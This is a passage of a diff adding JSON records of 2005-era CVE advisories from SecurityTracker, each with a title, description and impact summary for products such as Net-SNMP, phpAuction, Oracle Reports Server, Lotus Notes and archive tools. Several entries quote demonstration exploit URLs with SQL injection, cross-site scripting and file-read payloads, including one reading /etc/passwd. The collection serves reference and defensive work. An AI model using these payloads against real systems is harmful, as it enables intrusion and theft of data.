+        "title": "Net-SNMP Lets Remote Users Deny Service",
+        "body": "A vulnerability was reported in Net-SNMP. A remote user can cause denial of service conditions.A remote user can send specially crafted SNMP data via TCP to cause the target snmpd daemon to crash. No further details were provided.",
+        "extra": "A remote user can cause the SNMP daemon crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2254": [
+      {
+        "url": "http://securitytracker.com/id?1014423",
+        "title": "phpAuction Bugs Let Remote Users Conduct Cross-Site Scripting and SQL Injection Attacks and Bypass Authentication",
+        "body": "Diabolic Crab reported several vulnerabilities in phpAuction. A remote user can bypass authentication to access a target user's account. A remote user can conduct cross-site scripting attacks and inject SQL commands. A remote user can also determine the installation path.A remote user can set the 'PHPAUCTION_RM_ID' cookie value to the ID number of the target user to bypass authentication and gain access to a target user's account.The 'adsearch.php' script does not properly validate user-supplied input in the 'category' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.A demonstration exploit URL is provided: /phpauction-gpl-2.5/adsearch.php?title=1&desc=on&closed=on&category='SQL_INJECTION&minprice=1&maxprice=1&payment%5B%5D=on&payment%5B%5D=on&payment%5B%5D=on&payment%5B%5D=on&seller=1&country=Afghanistan&ending=1&SortProperty=ends&type=2&action=search&go=GO%20%3E%3EThe 'id' parameter of 'viewnews.php' is also affected.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the vulnerable software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Some demonstration exploit URLs are provided:/phpauction-gpl-2.5/index.php?lan=<script>alert(document.cookie)</script>/phpauction-gpl-2.5/profile.php?user_id=158&auction_id=<script>alert(document.cookie)</script>/phpauction-gpl-2.5/profile.php?auction_id=<script>alert(document.cookie)</script>&id=159/phpauction-gpl-2.5/admin/index.php?lan=<script>alert(document.cookie)</script>/login.php?username=<script>alert(document.cookie)</script>/viewnews.php?id=<script>alert(document.cookie)</script>A remote user can supply the following type of URLs to cause the system to disclose the installation path./phpauction-gpl-2.5/index.php?lan=../put/.inc.php/file/name/here/phpauction-gpl-2.5/admin/index.php?lan=../put/.inc.php/file/name/here",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the phpAuction software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute SQL commands on the underlying database.A remote user can determine the installation path.A remote user can bypass authentication.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2310": [
+      {
+        "url": "http://securitytracker.com/id?1014483",
+        "title": "Winamp MP3 ID3v2 Tag Buffer Overflow Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Winamp in the processing of MP3 ID3v2 tags. A remote user can cause arbitrary code to be executed on the target user's computer.A remote user can create a MP3 file with specially crafted ID3v2 tags. When the target user adds the file to their Winamp playlist and then plays the file, arbitrary code may be executed when the file is finished playing.A demonstration exploit is available at:http://security.lss.hr/PoC/demo.mp3Leon Juranic of LSS HR discovered this vulnerability.",
+        "extra": "A remote user can create an MP3 file that, when played by the target user, will execute arbitrary code on the target user's computer. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2340": [
+      {
+        "url": "http://securitytracker.com/id?1015463",
+        "title": "Apple QuickTime QTIF Buffer Overflow May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime in the processing of QTIF images. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted QTIF image that, when viewed by the target user, will trigger a heap overflow and execute arbitrary code on the target user's system.The code will run with the privileges of the target user.Apple credits Varun Uppal of Kanbay with reporting this vulnerability.CIRT.DK reported that PICT and JPEG files can also be used to trigger this vulnerability. Their advisory is available at:http://www.cirt.dk/advisories/cirt-41-advisory.pdf",
+        "extra": "A remote user can create an image that, when viewed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2341": [
+      {
+        "url": "http://securitytracker.com/id?1015426",
+        "title": "Blackberry Attachment Service TIFF and PNG File Processing Bugs May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in the Blackberry Attachment Service on the Blackberry Enterprise Server. A remote user can cause denial of service conditions. A remote user may be able to execute arbitrary code.A remote user can create a specially crafted Tagged Image File Format (TIFF) file that, when viewed by the target user on a Blackberry device, will trigger a heap overflow on the Blackberry Attachment Service and cuase the service to crash or potentially execute arbitrary code [CVE-2005-2341]. The Attachment Service will restart immediately or after a period of time.As a result, a user may not be able to view attachments. No other Blackberry services are affected.It may be possible to cause arbitrary code to be executed.FX reported that the software also does not properly process portable network graphics (PNG) images [CVE-2005-2344]. Versions from 4.0 to 4.0.1.9 are affected.FX of Phenoelit reported this vulnerability.",
+        "extra": "A remote user can cause the Attachment Service to crash or potentially execute arbitrary code.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2371": [
+      {
+        "url": "http://securitytracker.com/id?1014524",
+        "title": "Oracle Reports Server 'desname' Parameter Lets Remote Authenticated Users Overwrite Files",
+        "body": "A vulnerability was reported in Oracle Reports Server. A remote authenticated user can overwrite files on the target system.A remote authenticated user can supply a URL with a specially crafted 'desname' parameter to overwrite files on the target system with the privileges of the Oracle Application Server user account. On Windows-based systems, arbitrary files can be overwritten.The vendor was notified on August 12, 2003.Alexander Kornbrust of Red-Database-Security reported this vulnerability.",
+        "extra": "A remote authenticated user can overwrite arbitrary files with the privileges of the Oracle Application Server user account. On Windows-based systems, any file can be overwritten.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2378": [
+      {
+        "url": "http://securitytracker.com/id?1014525",
+        "title": "Oracle Reports Server Input Validation 'customize' Parameter XML File Disclosure",
+        "body": "A vulnerability was reported in Oracle Reports Server. A remote authenticated user can read portions of arbitrary XML files on the target system.A remote authenticated user can supply a URL with a specially crafted 'customize' parameter to view portions of the target XML file as part of the error message returned by the system. The parameter accepts absolute and relative path names.A demonstration exploit URL is provided:http://[target]:7778/reports/rwservlet?server=myserver+report=test.rdf+userid=scott/tiger@iasdb+destype=cache+desformat=xml+CUSTOMIZE=/opt/ORACLE/ias/oracle/product/9.0.2/webcache/webcache.xmlThe vendor was notified on August 26, 2003.Alexander Kornbrust of Red-Database-Security reported this vulnerability.",
+        "extra": "A remote authenticated user can read portions of arbitrary XML files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1014527",
+        "title": "Oracle Reports Server 'desformat' Parameter Lets Remote Authenticated Users Overwrite Files",
+        "body": "A vulnerability was reported in Oracle Reports Server. A remote authenticated user can read portions of arbitrary files on the target system.A remote authenticated user can supply a URL with a specially crafted 'desformat' parameter to view portions of the target file as part of the error message returned by the system. The parameter accepts absolute and relative path names.A demonstration exploit URL is provided:http://[target]:7778/reports/rwservlet?server=myserver+report=test.rdf+userid=scott/tiger@iasdb+destype=file+MODE=CHARACTER+desformat=/etc/passwdThe vendor was notified on August 27, 2003.",
+        "extra": "A remote authenticated user can read portions of arbitrary files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2454": [
+      {
+        "url": "http://securitytracker.com/id?1017086",
+        "title": "IBM Lotus Notes Lets Local Users Modify Critical Files",
+        "body": "A vulnerability was reported in IBM Lotus Notes. A local user can modify Notes program and data files.The client software installation process grants \"Full Control\" access privileges for the Notes program and data directory to the \"Everyone\" group on Windows-based systems.A local user can add, remove, modify, or replace files in those directories.The vendor was notified on July 22, 2005.Carsten Eiram of Secunia Research discovered this vulnerability.The original advisory is available at:http://secunia.com/secunia_research/2005-29/advisory/",
+        "extra": "A local user can modify Notes application and program files.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2495": [
+      {
+        "url": "http://securitytracker.com/id?1014887",
+        "title": "XFree86 pixmap Integer Overflows May Let Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in XFree86. A local user may be able to gain elevated privileges.The software does not properly parse pixmap images. A local user can create a specially crafted pixmap image that, when loaded by the target user, will execute arbitrary code with elevate privileges.The original bug report is available at:https://bugs.freedesktop.org/show_bug.cgi?id=594Luke Hutchison reported this vulnerability.",
+        "extra": "A local user may be able to execute arbitrary code with elevated privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2618": [
+      {
+        "url": "http://securitytracker.com/id?1015657",
+        "title": "IBM Lotus Domino/Notes Archive Processing Buffer Overflow and Directory Traversal Bugs Let Remote Users Execute Arbitrary Code and Delete Files",
+        "body": "Several vulnerabilities were reported in Lotus Domino/Notes. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can also cause files to be deleted.The 'kvarcve.dll' component does not properly validate data when generating the preview of a compressed file from a ZIP, UUE, or TAR archive [CVE-2005-2619]. A remote user can create a specially crafted file in an archive that, when previewed by the target user within the Notes attachment viewer, will delete arbitrary files with the privileges of the target user.Several buffer overflows exist in various Lotus Notes viewers [CVE-2005-2618].A remote user can create an e-mail message with a specially crafted link of about 800 characters in length and beginning with either \"http\", \"ftp\", or \"//\". When the target user loads the link, a stack overflow is triggered and arbitrary code can be executed. A link that references a local file can also be used to exploit this vulnerability.A remote user can create a TAR archive with a compressed file that has a long path of more than 220 bytes. When the target user views the archive and selects to extract the compressed file and save it to a directory with a long path name, a stack overflow is triggered in 'tarrdr.dll' and arbitrary code can be executed.A remote user can create a UUE file with an encoded file that has a long filename. When the target user views the file using the Notes attachment viewer, a stack overflow is triggered in 'uudrdr.dll' and arbitrary code can be executed.The vendor was notified in August 2005.The vendor indicates that only Windows-based systems are affected.Tan Chew Keong and Carsten Eiram of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can cause files to be deleted on the target user's system.A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2619": [
+      {
+        "url": "http://securitytracker.com/id?1015657",
+        "title": "IBM Lotus Domino/Notes Archive Processing Buffer Overflow and Directory Traversal Bugs Let Remote Users Execute Arbitrary Code and Delete Files",
+        "body": "Several vulnerabilities were reported in Lotus Domino/Notes. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can also cause files to be deleted.The 'kvarcve.dll' component does not properly validate data when generating the preview of a compressed file from a ZIP, UUE, or TAR archive [CVE-2005-2619]. A remote user can create a specially crafted file in an archive that, when previewed by the target user within the Notes attachment viewer, will delete arbitrary files with the privileges of the target user.Several buffer overflows exist in various Lotus Notes viewers [CVE-2005-2618].A remote user can create an e-mail message with a specially crafted link of about 800 characters in length and beginning with either \"http\", \"ftp\", or \"//\". When the target user loads the link, a stack overflow is triggered and arbitrary code can be executed. A link that references a local file can also be used to exploit this vulnerability.A remote user can create a TAR archive with a compressed file that has a long path of more than 220 bytes. When the target user views the archive and selects to extract the compressed file and save it to a directory with a long path name, a stack overflow is triggered in 'tarrdr.dll' and arbitrary code can be executed.A remote user can create a UUE file with an encoded file that has a long filename. When the target user views the file using the Notes attachment viewer, a stack overflow is triggered in 'uudrdr.dll' and arbitrary code can be executed.The vendor was notified in August 2005.The vendor indicates that only Windows-based systems are affected.Tan Chew Keong and Carsten Eiram of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can cause files to be deleted on the target user's system.A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2703": [
+      {
+        "url": "http://securitytracker.com/id?1014954",
+        "title": "Mozilla Firefox Integer/Buffer Overflows, Spoofing Bugs, and Access Control Errors Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Mozilla Firefox. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted XBM image file, that when loaded by the target user, will trigger a buffer overflow and execute arbitrary code [CVE-2005-2701]. The code will run with the privileges of the target user.A remote user can create HTML containing specially crafted \"zero-width non-joiner\" Unicode sequences that, when loaded by the target user, will cause the target user's browser to crash or potentially execute arbitrary code [CVE-2005-2702].The browser contains a flaw in making XMLHttp requests. A remote user can create specially crafted HTML that, when loaded by the target user, will spoof XMLHttpRequest headers and may be able to exploit other vulnerabilities on the target user's system or may be able to generate XMLHttp requests to other hosts [CVE-2005-2703].A remote user can create specially crafted HTML that spoof XML objects to create an XBL binding to execute arbitrary JavaScript with elevated (chrome) permissions [CVE-2005-2704].The JavaScript engine contains an integer overflow [CVE-2005-2705]. A remote user may be able to create HTML that, when loaded by the target user, will trigger the overflow and execute arbitrary code on the target user's system.A remote user can create HTML that will open an 'about:' page and execute arbitrary JavaScript with elevated (chrome) privileges [CVE-2005-2706].A remote user can create HTML that will open a new window without any user interfacecomponents (e.g., address bar, status bar) and potentially spoof various display elements [CVE-2005-2707].",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system with the privileges of the target user.A remote user can cause the target user's browser to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2709": [
+      {
+        "url": "http://securitytracker.com/id?1015434",
+        "title": "Linux Kernel sysctl() Interface Unregistration Error Lets Local Users Deny Service",
+        "body": "A vulnerability was reported in Linux Kernel. A local user can cause the kernel to crash.A local user can exploit an error in the sysctl() interface unregistration process to trigger a kerenl panic.",
+        "extra": "A local user can cause a kernel panic.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2752": [
+      {
+        "url": "http://securitytracker.com/id?1015127",
+        "title": "Mac OS X Kernel May Disclose Memory Contents to Local Users",
+        "body": "A vulnerability was reported in the Mac OS X kernel. A local user may be able to obtain kernel memory.A local user may be able to invoke certain kernel interfaces to obtain portions of unitialized kernel memory, which may contain sensitive information.",
+        "extra": "A local user can obtain portions of kernel memory.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2753": [
+      {
+        "url": "http://securitytracker.com/id?1015152",
+        "title": "Apple QuickTime Player Integer and Buffer Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Apple QuickTime Player. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted file that, when loaded by the target user, will cause the player to crash or to execute arbitrary code on the target user's system.The player contains an integer overflow in the processing of MOV video files. A sign extension of an embedded \"Pascal\" style string can trigger one overflow [CVE-2005-2753]. Invalid movie attributes can trigger another overflow [CVE-2005-2754]. The player does not properly process movies with a missing movie attribute, triggering a NULL pointer dereference and causing the player to crash [CVE-2005-2755].The Apple QuickTime PictureViewer contains a buffer overflow in the expansion of compressed PICT data [CVE-2005-2756].Piotr Bania discovered these vulnerabilities.The original advisories are available at:http://pb.specialised.info/all/adv/quicktime-mov-io1-adv.txthttp://pb.specialised.info/all/adv/quicktime-mov-io2-adv.txthttp://pb.specialised.info/all/adv/quicktime-mov-dos-adv.txthttp://pb.specialised.info/all/adv/quicktime-pict-adv.txt",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2754": [
+      {
+        "url": "http://securitytracker.com/id?1015152",
+        "title": "Apple QuickTime Player Integer and Buffer Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Apple QuickTime Player. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted file that, when loaded by the target user, will cause the player to crash or to execute arbitrary code on the target user's system.The player contains an integer overflow in the processing of MOV video files. A sign extension of an embedded \"Pascal\" style string can trigger one overflow [CVE-2005-2753]. Invalid movie attributes can trigger another overflow [CVE-2005-2754]. The player does not properly process movies with a missing movie attribute, triggering a NULL pointer dereference and causing the player to crash [CVE-2005-2755].The Apple QuickTime PictureViewer contains a buffer overflow in the expansion of compressed PICT data [CVE-2005-2756].Piotr Bania discovered these vulnerabilities.The original advisories are available at:http://pb.specialised.info/all/adv/quicktime-mov-io1-adv.txthttp://pb.specialised.info/all/adv/quicktime-mov-io2-adv.txthttp://pb.specialised.info/all/adv/quicktime-mov-dos-adv.txthttp://pb.specialised.info/all/adv/quicktime-pict-adv.txt",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2818": [
+      {
+        "url": "http://securitytracker.com/id?1014827",
+        "title": "DownFile Grants Administrative Access to Remote Users and Permits Cross-Site Scripting Attacks",
+        "body": "benozor77 reported a vulnerability was in DownFile. A remote user can gain administrative access on the target application. A remote user can also conduct cross-site scripting attacks.Certain administrative scripts do not properly authenticate remote users. A remote user can directly access the update.php, del.php, and add_form.php administrative scripts to gain administrative access on the application.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the DownFile software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The 'id' parameter in the email.php, index.php, and del.php scripts are affected.Some demonstration exploit URLs are provided:http://[target]/downfile/email.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/http://[target]/downfile/admin/del.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/The 'mode' parameter in add_form.php is also affected.A demonstration exploit URL is provided:http://[target]/downfile/admin/add_form.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/",
+        "extra": "A remote user can gain administrative access on the target application.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the DownFile software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2819": [
+      {
+        "url": "http://securitytracker.com/id?1014827",
+        "title": "DownFile Grants Administrative Access to Remote Users and Permits Cross-Site Scripting Attacks",
+        "body": "benozor77 reported a vulnerability was in DownFile. A remote user can gain administrative access on the target application. A remote user can also conduct cross-site scripting attacks.Certain administrative scripts do not properly authenticate remote users. A remote user can directly access the update.php, del.php, and add_form.php administrative scripts to gain administrative access on the application.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the DownFile software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The 'id' parameter in the email.php, index.php, and del.php scripts are affected.Some demonstration exploit URLs are provided:http://[target]/downfile/email.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/http://[target]/downfile/admin/del.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/The 'mode' parameter in add_form.php is also affected.A demonstration exploit URL is provided:http://[target]/downfile/admin/add_form.php?id=%22%3E%3Cscript%3Ealert(navigator.appVersion)%3C/script%3E/",
+        "extra": "A remote user can gain administrative access on the target application.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the DownFile software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2856": [
+      {
+        "url": "http://securitytracker.com/id?1016011",
+        "title": "Servant Salamander Buffer Overflow in 'unacev2.dll' Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Servant Salamander. A remote user can cause arbitrary code to be executed on the target system.A remote user can create an ACE archive with a specially crafted filename that, when extracted by the target user, will trigger a buffer overflow in 'unacev2.dll' and execute arbitrary code on the target system. The code will run with the privileges of the target user.The vendor was notified on April 27, 2006.Tan Chew Keong of Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016012",
+        "title": "WinHKI Buffer Overflow in 'ztvunacev2.dll' Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in WinHKI. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an ACE archive with a specially crafted filename that, when extracted by the target user, will trigger a buffer overflow in 'ztvunacev2.dll' (UNACEV2.DLL) and execute arbitrary code on the target user's system. The code will run with the privileges of the target user.The vendor was notified on March 30, 2006.Tan Chew Keong of Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015852",
+        "title": "Total Commander Buffer Overflow UNACEV2.DLL Lets Remote Users Cause Arbitrary Code to Be Executed",
+        "body": "A vulnerability was reported in Total Commander. A remote user can cause arbitrary code to be executed on the target user's system.The UNACEV2.DLL component contains a buffer overflow. A remote user can create an ACE archive containing a file that has a specially crafted filename. When the target user extracts the archive, the stack overlow will be triggered and arbitrary code will be executed. The code will run with the privileges of the target user.Tan Chew Keong of Secunia Research discovered this vulnerability in ALZip (see Alert ID 1014863). Total Commander is also affected.",
+        "extra": "A remote user can create an archive that, when processed by the target user, will cause arbitrary code to be executed on the target user's system. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1014863",
+        "title": "ALZip Buffer Overflow UNACEV2.DLL Lets Remote Users Cause Arbitrary Code to Be Executed",
+        "body": "A vulnerability was reported in ALZip. A remote user can cause arbitrary code to be executed on the target user's system.The UNACEV2.DLL component contains a buffer overflow. A remote user can create an ACE archive containing a file that has a specially crafted filename. When the target user extracts the archive, the stack overlow will be triggered and arbitrary code will be executed. The code will run with the privileges of the target user. The vendor was notified on August 22, 2005.Tan Chew Keong of Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create an archive that, when processed by the target user, will cause arbitrary code to be executed on the target user's system. The code will run with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016065",
+        "title": "Anti-Trojan Buffer Overflow in 'unacev2.dll' in Processing ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Emsi Software's Anti-Trojan. A remote user can execute arbitrary code on the target system.A remote user can create an ACE archive containing a file with a specially crafted filename. When the archive is scanned, a buffer overflow will occur in 'unacev2.dll' and arbitrary code will be executed on the target user's system. The code will run with the privileges of the target user.The \"Search in archive files\" option must be enabled for this vulnerability to be exploited.The vendor was notified on May 8, 2006.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016088",
+        "title": "FilZip Buffer Overflow in 'unacev2.dll' in Processing ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in FilZip. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an ACE archive containing a file with a specially crafted filename. When the archive is expanded, a buffer overflow will occur in 'unacev2.dll' and arbitrary code will be executed on the target user's system. The code will run with the privileges of the target user.The vendor was notified on April 26, 2006 and several additional times without response.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016066",
+        "title": "UltimateZIP Buffer Overflow in Extracting ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in UltimateZip. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an ACE archive with a file that has a specially crafted filename. When the archive is extracted, a buffer overflow will occur in 'unacev2.dll' and arbitrary code will be executed on the target user's system. The code will run with the privileges of the target user.The vendor was notified on April 26, 2006 and later dates, without response.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create an archive that, when extracted by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016114",
+        "title": "Eazel Buffer Overflow in 'ztvunacev2.dll' in Processing ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Eazel. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted ACE archive that, when loaded by the target user, will trigger a buffer overflow in 'ztvunacev2.dll' ('unacev2.dll') and execute arbitrary code on the target system. The code will run with the privileges of the target user.The vendor was notified on May 3, 2006.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016115",
+        "title": "IZArc Buffer Overflow in 'unacev2.dll' in Processing ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in IZArc. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted ACE archive that, when loaded by the target user, will trigger a buffer overflow in 'unacev2.dll' and execute arbitrary code on the target system. The code will run with the privileges of the target user.The vendor was notified on May 4, 2006.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016177",
+        "title": "Rising Antivirus Stack Overflow in Scanning ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Rising Antivirus. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted ACE archive that, when scanned by the target user, will trigger a buffer overflow in UNACEV2.DLL and execute arbitrary code on the target system. The code will run with the privileges of the target user.An ACE archive containing a file with a specially crafted filename can trigger the overflow.The vendor was notified on May 8, 2006.Secunia Research discovered this vulnerability.The original advisory is available at:http://secunia.com/secunia_research/2006-36/advisory/",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016257",
+        "title": "AutoMate Buffer Overflow in 'unacev2.dll' Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in AutoMate. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an ACE archive containing a file with a specially crafted filename. When the target user schedules a task to extract the archive and the task subsequently executes, a buffer overflow will occur and arbitrary code will be executed on the target system.The buffer overflow resides in 'UNACEV2.DLL'.The vendor was notified on May 2, 2006 and later dates.Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1016512",
+        "title": "BitZipper Buffer Overflow in Processing ACE Archives Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in BitZipper. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create an ACE archive with a specially crafted filename that, when extracted by the target user, will trigger a buffer overflow in 'unacev2.dll' and execute arbitrary code on the target system. The code will run with the privileges of the target user.The vendor was notified on May 2, 2006.Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create an archive that, when extracted by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2922": [
+      {
+        "url": "http://securitytracker.com/id?1015808",
+        "title": "RealPlayer Heap Overflow in Embedded Player May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in RealPlayer. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted web page that, when loaded by the target user, will invoke the embedded player and trigger a heap overflow in the player.RealOne Player v1 and v2, RealPlayer 8, and RealPlayer Enterprise are also affected.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2923": [
+      {
+        "url": "http://securitytracker.com/id?1015318",
+        "title": "Ipswitch IMail Server IMAP LIST Command Bug Lets Remote Authenticated Users Deny Service",
+        "body": "A vulnerability was reported in Ipswitch IMail Server. A remote authenticated user can cause denial of service conditions.The server does not properly process user-supplied input to the IMAP LIST command. A remote authenticated user can send a specially crafted LIST command with approximately 8000 bytes to trigger a memory allocation error in some internal string parsing routines. As a result, the IMAP daemon will crash.The vendor was notified on September 8, 2005.iDEFENSE reported this vulnerability.The original advisory is available at:http://www.idefense.com/application/poi/display?id=347&type=vulnerabilities",
+        "extra": "A remote authenticated user can the target IMAP service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2929": [
+      {
+        "url": "http://securitytracker.com/id?1015195",
+        "title": "Lynx 'lynxcgt:' Handler Configuration Bug Lets Remote Users Execute Arbitrary Commands",
+        "body": "iDEFENSE reported a vulnerability in Lynx. A remote user can cause arbitrary commands to be executed on the target user's system.A remote user can create a specially crafted link, when loaded by the target user, will invoke the 'lynxcgi:' handler and execute arbitrary commands. The commands will run with the privileges of the target user.The 'lynxexec' and 'lynxprog' handlers are also affected.The vendor was notified on October 27, 2005.The original advisory is available at:http://www.idefense.com/application/poi/display?id=338&type=vulnerabilities",
+        "extra": "A remote user can cause arbitrary commands to be executed on the target user's system with the privileges of the target user.",
